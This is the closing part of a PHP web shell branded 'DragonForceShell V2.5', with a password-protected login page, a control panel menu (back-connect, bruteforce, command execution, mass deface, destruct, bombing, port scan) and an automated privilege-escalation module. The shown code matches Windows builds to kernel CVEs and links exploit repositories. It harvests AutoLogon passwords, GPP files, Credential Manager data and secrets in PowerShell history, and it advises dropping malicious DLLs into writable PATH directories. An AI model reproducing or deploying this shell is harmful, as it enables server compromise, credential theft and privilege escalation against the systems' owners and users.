            array('cve'=>'CVE-2021-34527','name'=>'PrintNightmare (second patch bypass)',
                'minBuild'=>7601,'desc'=>'Print Spooler additional RCE vector','exploit'=>'https://github.com/cube0x0/CVE-2021-1675'),
            array('cve'=>'CVE-2021-36934','name'=>'HiveNightmare / SeriousSAM',
                'minBuild'=>10240,'maxBuild'=>22000,'desc'=>'SAM/SYSTEM hives readable via shadow copies','exploit'=>'https://github.com/GossiTheDog/HiveNightmare'),
            array('cve'=>'CVE-2020-0796','name'=>'SMBGhost',
                'minBuild'=>1903,'maxBuild'=>20041,'desc'=>'SMBv3 compression RCE/LPE','exploit'=>'https://github.com/danigargu/CVE-2020-0796'),
            array('cve'=>'CVE-2021-34484','name'=>'User Profile Service LPE',
                'minBuild'=>10240,'desc'=>'User Profile Service privilege escalation','exploit'=>'https://github.com/klinix5/CVE-2021-34484'),
            array('cve'=>'CVE-2022-21882','name'=>'Win32k LPE',
                'minBuild'=>10240,'maxBuild'=>22000,'desc'=>'Win32k elevation of privilege','exploit'=>'https://github.com/KaLendsi/CVE-2022-21882'),
            array('cve'=>'CVE-2022-21999','name'=>'Print Spooler LPE',
                'minBuild'=>10240,'desc'=>'Windows Print Spooler EoP','exploit'=>'https://github.com/ly4k/SpoolFool'),
            array('cve'=>'CVE-2023-21768','name'=>'AFD.sys LPE',
                'minBuild'=>22000,'maxBuild'=>22631,'desc'=>'Ancillary Function Driver EoP','exploit'=>'https://github.com/chompie1337/Windows_LPE_AFD_CVE-2023-21768'),
            array('cve'=>'CVE-2024-30088','name'=>'Windows Kernel EoP',
                'minBuild'=>10240,'desc'=>'Windows kernel elevation of privilege','exploit'=>'https://github.com/tykawaii98/CVE-2024-30088'),
            array('cve'=>'CVE-2024-21338','name'=>'AppLocker LPE',
                'minBuild'=>10240,'desc'=>'Windows kernel → AppLocker bypass → SYSTEM','exploit'=>'https://github.com/niclasf1/CVE-2024-21338'),
            array('cve'=>'CVE-2023-36884','name'=>'Office/Windows HTML RCE',
                'minBuild'=>10240,'desc'=>'Microsoft Windows and Office spoofing','exploit'=>'https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36884'),
            array('cve'=>'CVE-2025-24989','name'=>'Windows Kernel LPE',
                'minBuild'=>10240,'desc'=>'Windows kernel elevation of privilege vulnerability','exploit'=>'https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-24989'),
        );

        $matched = array();
        foreach($cves as $cve){
            $b = intval($build);
            $min = isset($cve['minBuild']) ? intval($cve['minBuild']) : 0;
            $max = isset($cve['maxBuild']) ? intval($cve['maxBuild']) : 999999;
            if($b >= $min && $b <= $max){
                $matched[] = $cve;
            }
        }

        $body = "<p>Windows version: <b>".htmlspecialchars($verStr)."</b> | Build: <b>".htmlspecialchars($build)."</b></p>";
        if(!empty($matched)){
            $body .= "<p style='color:#f70000'><b>".count($matched)." matching CVE(s):</b></p>";
            foreach($matched as $cve){
                $body .= "<div style='margin:6px 0;padding:8px;border-left:3px solid #f70000;background:rgba(247,0,0,0.08);border-radius:6px'>";
                $body .= "<b style='color:#f70000'>".$this->DFSH($cve['cve'])."</b> — ".$this->DFSH($cve['name'])."<br>";
                $body .= "<span style='font-size:11px;color:#ddd'>".$this->DFSH($cve['desc'])."</span><br>";
                $body .= "<span style='font-size:11px;color:#4d7cff'>Exploit: <a href='".$this->DFSH($cve['exploit'])."' target='_blank'>".htmlspecialchars($cve['exploit'])."</a></span>";
                $body .= "</div>";
            }
            $this->DFSLPEAdd('Windows Kernel CVEs', 'critical', $body);
            $this->DFSLPELog($t,'found',count($matched).' kernel CVEs matched','critical');
        }else{
            $body .= "<p style='color:#aaa'>No matching kernel CVEs for this build number.</p>";
            $this->DFSLPEAdd('Windows Build Info', 'info', $body);
            $this->DFSLPELog($t,'not_found',"No CVE matches for build $build",'low');
        }
    }

    private function LPE_Win_StoredCredentials(){
        $t = 'Stored Credentials';
        $this->DFSLPELog($t,'checked','Checking for AutoLogon, Credential Manager, GPP passwords','high');

        $body = '';
        $found = false;

        // AutoLogon
        $autoLogon = trim($this->DFSLPEWinPS("(Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name DefaultUserName,DefaultPassword -ErrorAction SilentlyContinue) | ConvertTo-Json"));
        if($autoLogon && stripos($autoLogon,'DefaultUserName')!==false){
            $body .= "<p style='color:#f70000'><b>AutoLogon credentials found in registry!</b></p><pre>".htmlspecialchars($autoLogon)."</pre>";
            $found = true;
        }

        // GPP passwords
        $gppPath = "\\sysvol\\*.xml";
        $gpp = $this->DFSLPEWinPS("Get-ChildItem -Path '\\\\*\\sysvol\\*.xml' -Recurse -ErrorAction SilentlyContinue | Select-Object -First 5 FullName");
        if(!empty($gpp) && stripos($gpp,'FullName')!==false){
            $body .= "<p style='color:#FFD700'><b>GPP XML files found in SYSVOL:</b></p><pre>".htmlspecialchars(trim($gpp))."</pre>";
            $body .= "<p style='color:#aaa;font-size:11px'>Decrypt GPP cpassword with <code>gpp-decrypt</code> tool.</p>";
            $found = true;
        }

        // Credential Manager
        $credDir = getenv('LOCALAPPDATA')."\\Microsoft\\Credentials";
        if(is_dir($credDir)){
            $creds = $this->DFSLPEWinPS("Get-ChildItem -Path '$credDir' -Recurse -ErrorAction SilentlyContinue | Select-Object Name,Length");
            if(!empty($creds) && stripos($creds,'Name')!==false){
                $body .= "<p style='color:#FFD700'><b>Credential Manager files found:</b></p><pre>".htmlspecialchars(trim($creds))."</pre>";
                $body .= "<p style='color:#aaa;font-size:11px'>Use SharpDPAPI or DPAPI to extract credentials.</p>";
                $found = true;
            }
        }

        // PowerShell history
        $psHistory = getenv('APPDATA')."\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt";
        if(is_file($psHistory)){
            $histContent = @file_get_contents($psHistory);
            if($histContent && preg_match('/password|passwd|secret|credential|token|apikey/i',$histContent)){
                $matches = array();
                preg_match_all('/.*password.*|.*passwd.*|.*secret.*|.*credential.*/i',$histContent,$matches);
                $body .= "<p style='color:#FFD700'><b>PowerShell history contains potential credentials</b> (".count($matches[0])." lines matched)</p>";
                $body .= "<pre style='max-height:100px;overflow:auto'>".htmlspecialchars(implode("\n",array_slice($matches[0],0,10)))."</pre>";
                $found = true;
            }
        }

        if(!$found){
            $this->DFSLPELog($t,'not_found','No stored credentials found','low');
            return;
        }
        $this->DFSLPEAdd('Stored Credentials', 'high', $body);
        $this->DFSLPELog($t,'found','Stored credentials found','high');
    }

    private function LPE_Win_DLLHijacking(){
        $t = 'DLL Hijacking / Writable PATH';
        $this->DFSLPELog($t,'checked','Checking writable directories in system PATH','high');

        $psCmd = '$env:PATH -split ";" | ForEach-Object { if($_ -and (Test-Path $_) -and (Get-Acl $_).Access | Where-Object { $_.FileSystemRights -match "Write|FullControl" -and $_.IdentityReference -notmatch "^(NT AUTHORITY\\\\SYSTEM|BUILTIN\\\\Administrators)$" }) { $_ } }';
        $out = $this->DFSLPEWinPS($psCmd);

        if(empty($out)){
            $this->DFSLPELog($t,'not_found','No writable PATH directories','low');
            return;
        }

        $body = "<p style='color:#f70000'><b>Writable directories in system PATH:</b></p>";
        $body .= "<pre>".htmlspecialchars(trim($out))."</pre>";
        $body .= "<p style='color:#aaa;font-size:11px'>Drop a malicious DLL (e.g. cabinet.dll, winspool.drv) to hijack program loading.</p>";
        $this->DFSLPEAdd('DLL Hijacking (PATH)', 'high', $body);
        $this->DFSLPELog($t,'found','Writable PATH dirs found','high');
    }

    // --- Main entry point ---

    public function DFSLPE(){
        // The audit spawns many subprocesses; give it headroom beyond default limits.
        @set_time_limit(180);
        if(function_exists('ini_set')) @ini_set('memory_limit','512M');

        $this->lpeFindings = array();
        $this->lpeTechniques = array();
        $this->lpePlatform = '';
        $this->lpeArch = '';
        $this->lpeKernel = '';
        $this->lpeUser = '';
        $this->lpeIsRoot = false;

        // Phase 1: Detect OS
        $this->DFSLPEDetectOS();

        $lpeResults = "<section class='lpe'>";
        $lpeResults .= "<h3>Auto Privilege Escalation Audit <small style='color:#888'>(v2.5 — Cross-Platform)</small></h3>";

        // System info banner
        $lpeResults .= "<div class='lpe-finding lpe-info'>";
        $lpeResults .= "<h4>System Information</h4>";
        $lpeResults .= "<div class='lpe-body'><ul>";
        $lpeResults .= "<li><b>User:</b> ".$this->DFSH($this->lpeUser)." | <b>Platform:</b> ".strtoupper($this->lpePlatform)." | <b>Arch:</b> ".$this->DFSH($this->lpeArch);
        $lpeResults .= " | <b>Root/Admin:</b> ".($this->lpeIsRoot?'<span style="color:#f70000">YES</span>':'No')."</li>";
        $lpeResults .= "<li><b>".($this->lpePlatform==='windows'?'Build/Kernel':'Kernel').":</b> ".$this->DFSH($this->lpeKernel)."</li>";
        $lpeResults .= "</ul></div></div>";

        // Phase 2: Run techniques
        if($this->lpePlatform === 'linux'){
            $this->LPE_Linux_SUID();
            $this->LPE_Linux_Capabilities();
            $this->LPE_Linux_KernelCVE();
            $this->LPE_Linux_WritablePasswd();
            $this->LPE_Linux_SudoConfig();
            $this->LPE_Linux_WritableSystemPaths();
            $this->LPE_Linux_Docker();
            $this->LPE_Linux_CronJobs();
            $this->LPE_Linux_NFS();
            $this->LPE_Linux_WritableServices();
            $this->LPE_Linux_WritableTmpAndPath();
            $this->LPE_Linux_Polkit();
        }elseif($this->lpePlatform === 'windows'){
            $this->LPE_Win_TokenPrivileges();
            $this->LPE_Win_UnquotedService();
            $this->LPE_Win_WritableServiceBinaries();
            $this->LPE_Win_AlwaysInstallElevated();
            $this->LPE_Win_UACBypass();
            $this->LPE_Win_AutorunKeys();
            $this->LPE_Win_ScheduledTasks();
            $this->LPE_Win_KernelCVE();
            $this->LPE_Win_StoredCredentials();
            $this->LPE_Win_DLLHijacking();
        }else{
            $lpeResults .= "<div class='lpe-finding lpe-critical'><h4>Unsupported Platform</h4>";
            $lpeResults .= "<p>Detected platform: ".$this->DFSH(PHP_OS).". LPE checks support Linux and Windows only.</p></div>";
        }

        // Phase 3: Render findings
        $severityOrder = array('critical'=>0,'high'=>1,'medium'=>2,'info'=>3,'low'=>4);
        usort($this->lpeFindings, function($a,$b) use($severityOrder){
            $sa = isset($severityOrder[$a['severity']]) ? $severityOrder[$a['severity']] : 5;
            $sb = isset($severityOrder[$b['severity']]) ? $severityOrder[$b['severity']] : 5;
            return $sa - $sb;
        });

        $counts = array('critical'=>0,'high'=>0,'medium'=>0,'info'=>0);
        foreach($this->lpeFindings as $f){
            if(isset($counts[$f['severity']])) $counts[$f['severity']]++;
            $cls = 'lpe-'.$f['severity'];
            $icons = array('critical'=>'&#9888;','high'=>'&#9888;','medium'=>'&#9888;','info'=>'&#9432;');
            $icon = isset($icons[$f['severity']]) ? $icons[$f['severity']] : '';
            $lpeResults .= "<div class='lpe-finding $cls'>";
            $lpeResults .= "<h4>$icon ".$this->DFSH($f['title'])." <span style='color:#666;font-size:11px;text-transform:uppercase'>[".$f['severity']."]</span></h4>";
            $lpeResults .= "<div class='lpe-body'>".$f['body']."</div>";
            if(!empty($f['exploit'])){
                $lpeResults .= "<p style='color:#aaa;font-size:11px'>".$this->DFSH($f['exploit'])."</p>";
            }
            $lpeResults .= "</div>";
        }

        // Phase 4: Technique log (transparency)
        $lpeResults .= "<details style='margin-top:12px'>";
        $lpeResults .= "<summary style='cursor:pointer;color:#888;font-size:12px'>View technique evaluation log (".count($this->lpeTechniques)." techniques checked)</summary>";
        $lpeResults .= "<div style='margin-top:8px;padding:8px;background:rgba(0,0,0,0.4);border-radius:8px;font-size:11px'>";
        foreach($this->lpeTechniques as $tl){
            $statusIcons = array('checked'=>'&#9711;','found'=>'&#10003;','not_found'=>'&#10007;','skipped'=>'&#8856;','error'=>'&#9888;');
            $sIcon = isset($statusIcons[$tl['status']]) ? $statusIcons[$tl['status']] : '?';
            $lpeResults .= "<p style='margin:2px 0;color:#ccc'>".$sIcon." <b>".$this->DFSH($tl['technique'])."</b>: <span style='color:#".($tl['status']==='found'?'f70000':($tl['status']==='not_found'?'69e01f':'aaa'))."'>".$tl['status']."</span> — ".$this->DFSH($tl['reason'])."</p>";
        }
        $lpeResults .= "</div></details>";

        // Phase 5: Summary
        $totalFindings = $counts['critical'] + $counts['high'] + $counts['medium'];
        $lpeResults .= "<div class='lpe-summary'>";
        $lpeResults .= "<h4>Audit Complete: <b>$totalFindings</b> finding(s)";
        if($counts['critical']>0) $lpeResults .= " &mdash; <span style='color:#f70000'>".$counts['critical']." CRITICAL</span>";
        if($counts['high']>0) $lpeResults .= " &mdash; <span style='color:#FFD700'>".$counts['high']." HIGH</span>";
        if($counts['medium']>0) $lpeResults .= " &mdash; <span style='color:#ffa500'>".$counts['medium']." MEDIUM</span>";
        $lpeResults .= " | ".count($this->lpeTechniques)." techniques evaluated</h4>";
        $lpeResults .= "</div>";

        $lpeResults .= "</section>";
        return $lpeResults;
    }

    public function DFSRenderArray($array_replace,$contents){
        $arrRep = sizeof($array_replace);
        $x = 1;
        for($i=0;$i<$arrRep;$i++){
            $contents = $this->DFSRender("/%{A".$x."}%/i",$array_replace[$i],$contents);
            $x++;
        }
        return $contents;
    }

    public function DFSRender($pattern,$replace,$from){
        $contents = preg_replace($pattern,$replace,$from);
        return $contents;
    }
    public function DFSAdmin(){
        // v2.3: prefer local template (your improved login.html), then remote, then inline fallback
        $local = __DIR__ . '/contents/login.html';
        if(is_file($local)){ $c = @file_get_contents($local); if($c!==false && $c!==""){ return $c; } }
        $c = $this->DFSFetch(self::$remote_url . "/login.html");
        if($c!==""){ return $c; }
        return "<!DOCTYPE html><html lang='en'><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1'>"
        ."<title>DragonForceShell V2.5 - Login</title><style>"
        ."body{min-height:100vh;display:flex;align-items:center;justify-content:center;background:#0d0b00;color:#FFD700;font-family:monospace;margin:0;padding:20px}"
        .".c{width:100%;max-width:360px;text-align:center;background:#000;border:1px solid #4a3d05;border-radius:14px;padding:28px 24px}"
        .".b{font-size:24px;letter-spacing:3px;color:#4d7cff}.b span{color:#f70000}h1{font-size:15px;letter-spacing:2px;margin:6px 0 2px}"
        .".s{font-size:10px;color:#888;margin-bottom:16px;letter-spacing:1px}"
        ."input[type=password]{width:100%;height:42px;background:#111;border:1px solid #4a3d05;border-radius:8px;color:#FFD700;font-size:16px;padding:0 12px;outline:none}"
        ."input[type=submit]{width:100%;height:42px;margin-top:12px;border:none;border-radius:8px;background:#2b2470;color:#fff;letter-spacing:3px;cursor:pointer}"
        ."</style></head><body><div class='c'><div class='b'>DFS <span>V2.5</span></div><h1>DragonForceShell</h1>"
        ."<p class='s'>RESTRICTED ACCESS</p><form action='' method='POST' autocomplete='off'>"
        ."<input type='password' name='password' required autofocus placeholder='Password'>"
        ."<input type='submit' name='login' value='UNLOCK'></form></div></body></html>";
    }
    public function DFStart(){
        // v2.3: prefer local templates so `php -S` dev shows your edits without pushing to GitHub
        $localHead = __DIR__ . '/contents/head.html';
        $localCss  = __DIR__ . '/contents/dfs.css';
        $localJs   = __DIR__ . '/contents/script.js';
        if(is_file($localHead)){ $contents = @file_get_contents($localHead); }
        else{ $contents = $this->DFSFetch(self::$remote_url . "/head.html"); }
        if(!isset($contents)||$contents===""||$contents===false){ $contents = "<!DOCTYPE html><html lang='en'><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1'><title>DragonForceShell V2.5 [DFS]</title><script>%{js}%</script><style>%{style}%</style></head><body><div style='text-align:center;color:#4d7cff;letter-spacing:3px'>DFS <span style='color:#f70000'>V2.5</span></div>%{body}%"; }
        if(is_file($localCss)){ $css = @file_get_contents($localCss); }
        else{ $css = $this->DFSFetch(self::$remote_url . "/dfs.css"); }
        if(!isset($css)||$css===""||$css===false){ $css = "body{background:#0d0b00;color:#FFD700;font-family:monospace} a{color:#FFD700}"; }
        if(is_file($localJs)){ $js = @file_get_contents($localJs); }
        else{ $js = $this->DFSFetch(self::$remote_url . "/script.js"); }
        if(!isset($js)||$js===false){ $js = ""; }
        $contents = preg_replace('/%{style}%/i',$css,$contents);
        $contents = preg_replace('/%{js}%/i',$js,$contents);
        return $contents;
    }

    public function DFSBody($location,$pattern,$from){
        $local = __DIR__ . '/contents/' . basename($location);
        if(is_file($local)){ $contents = @file_get_contents($local); }
        else{ $contents = $this->DFSFetch(self::$remote_url . "/".$location); }
        if(!isset($contents)||$contents===""||$contents===false){
            // v2.3 local fallback nav (includes new actions)
            $contents = "<section class=\"bodytop\"><ul><li><a href='%{A1}%'>Directory</a></li><li><a href='%{A2}%'>Config</a></li><li><a href='%{A3}%'>BackConnect</a></li><li><a href='%{A4}%'>Symlink</a></li><li><a href='%{A5}%'>Bruteforce</a></li><li><a href='%{A6}%'>Command</a></li><li><a href='%{A7}%'>Mass</a></li><li><a href='%{A8}%'>Database</a></li><li><a href='%{A9}%'>Destruct</a></li><li><a href='%{A10}%'>Bombing</a></li><li><a href='%{A12}%'>NetScan</a></li><li><a href='%{A13}%'>PortScan</a></li><li><a href='%{A14}%'>Search</a></li><li><a href='%{A15}%'>PHPInfo</a></li><li><a href='%{A16}%'>Auto LPE</a></li><li class='logout'><a href='%{A11}%'>Logout</a></li></ul></section>";
        }
        $from = $this->DFSRender($pattern,$contents,$from);
        return $from;
    }

    public function DFSEnd(){
        $local = __DIR__ . '/contents/foot.html';
        if(is_file($local)){ $contents = @file_get_contents($local); }
        else{ $contents = $this->DFSFetch(self::$remote_url . "/foot.html"); }
        if(!isset($contents)||$contents===""||$contents===false){ $contents = "<section class='eagle'><p style='color:#fff;text-align:center'>DragonForceShell V2.5 by EagleEye</p></section>"; }
        return $contents;
    }
    public function DFSDefault(){
        $this->DFSAction('upload');
        $this->DFSAction('mkdir');
        $this->DFSAction('mkfile');
    }
    public function DFSDirFilter($path){
        if($GLOBALS['DFSPlatform']!=='win'){
            $x = preg_replace("/%2F%2F/i","/",(urlencode($path)));
        }else{
            $x = preg_replace("/%5C%5C/i","\\",(urlencode($path)));
        }
        $this->string = urldecode($x);
        return $this->Enc();
    }
}

$shell = new DFShell();

if(!isset($_SESSION['DFS_Auth']) || empty($_SESSION['DFS_Auth'])){
    if(isset($GLOBALS['DFConfig'][1]['login'])){
        $shell->string = $GLOBALS['DFConfig'][1]['password'];
        if($shell->DFSLogin(urlencode($shell->Enc()))){
            header('Location: '.$GLOBALS['DFConfig'][2]['REQUEST_URI']);
        }
    }else{
        echo $shell->DFSAdmin();
        if(isset($GLOBALS['DFConfig'][0]['cnc'])){
            $comex = explode(";",$GLOBALS['DFConfig'][0]['cnc']);
            if(is_array($comex) && count($comex)>1){
                $shell->triggered($comex[0],$comex[1]);
            }
        }
    }
}else{
    //process for update
    if(isset($GLOBALS['DFConfig'][0]['dfd']) && isset($GLOBALS['DFConfig'][0]['dfp']) && isset($GLOBALS['DFConfig'][0]['dfaction']) ){
        if(!empty($GLOBALS['DFConfig'][0]['dfd']) && !empty($GLOBALS['DFConfig'][0]['dfp']) && $GLOBALS['DFConfig'][0]['dfaction']=='download')
        {
            $shell->query = array($GLOBALS['DFConfig'][0]['dfp'],$GLOBALS['DFConfig'][0]['dfd']);
            $shell->DFSAction($GLOBALS['DFConfig'][0]['dfaction']);
        }
        else
        {
            echo "Path/File Undefined!";
        }
    }else{
        $contents = $shell->DFStart();
        $chead = $shell->DFSInfo();
        
       if(isset($DFConfig[0]['dfp'])){
           $cmdx = "?dfp=".urlencode($DFConfig[0]['dfp'])."&dfaction=cmd";
       }else{
        $cmdx = "?dfaction=cmd";
       }

        $toReplace = array($GLOBALS['DFConfig'][2]['PHP_SELF'],"?dfaction=conf","?dfaction=reverse",
                          "?dfaction=sym","?dfaction=crack",$cmdx,"?dfaction=mass","?dfaction=sql",
                          "?dfaction=dest","?dfaction=bombing","?dfaction=logout",
                          "?dfaction=netscan","?dfaction=portscan","?dfaction=search","?dfaction=phpinfo","?dfaction=lpe");

        $contents = $shell->DFSRender("/%{body}%/i","%{DFSI}%",$contents);
        $contents = $shell->DFSRender("/%{DFSI}%/i",$chead,$contents);
        $contents = $shell->DFSBody("bodytop.html","/%{main}%/i",$contents);
        $contents = $shell->DFSRenderArray($toReplace,$contents);
        echo $contents;

        if(!isset($DFConfig[0]['dfp'])){
            if(!isset($DFConfig[0]['dfaction']) || empty($DFConfig[0]['dfaction']))
            {
                $shell->string = $DFSyntax[4]();
                $shell->query = array($shell->Enc(),null);
                $shell->DFSAction("scand");
            }
            else
            {
                if(in_array($DFConfig[0]['dfaction'],$GLOBALS['DFSOptions'])){
                    //$shell->query = array($DFConfig[0]['dfp'],$DFConfig[0]['dff']);
                    $shell->DFSAction($DFConfig[0]['dfaction']);
                    //echo "works";
                }
            }
            $shell->DFSDefault();
        }else{
            //echo "<font color='white'>".$shell->Dec($DFConfig[0]['dfp'])."</font><br>";
            if(isset($DFConfig[0]['dff'])){
                if(!isset($DFConfig[0]['dfaction'])){
                    $shell->query = array($DFConfig[0]['dfp'],$DFConfig[0]['dff']);
                    $shell->DFSAction('view');
                }else{
                    $shell->query = array($DFConfig[0]['dfp'],$DFConfig[0]['dff']);
                    $shell->DFSAction($DFConfig[0]['dfaction']);
                }
            }else{

                if(isset($DFConfig[0]['dfaction'])){
                    $shell->query = array($DFConfig[0]['dfp'],null);
                    $shell->DFSAction($DFConfig[0]['dfaction']);
                }else{
                    $shell->query = array($DFConfig[0]['dfp'],null);
                    $shell->DFSAction('scand');
                }
            }
            $shell->query = array($DFConfig[0]['dfp'],null);
            $shell->DFSDefault();
        }

        if(isset($DFConfig[1]['toencstr'])){
            $shell->string = $DFConfig[1]['encstr'];
            $shell->DFSPopupMSG(1,"Encryption for ".$DFConfig[1]['encstr'],$shell->Enc(),"So you can change password",true);
        }
        $shell->DFSAction("zipping");
        $shell->DFSAction("massdel");
        $footer = $shell->DFSEnd();
        print($footer);
    }
}?>
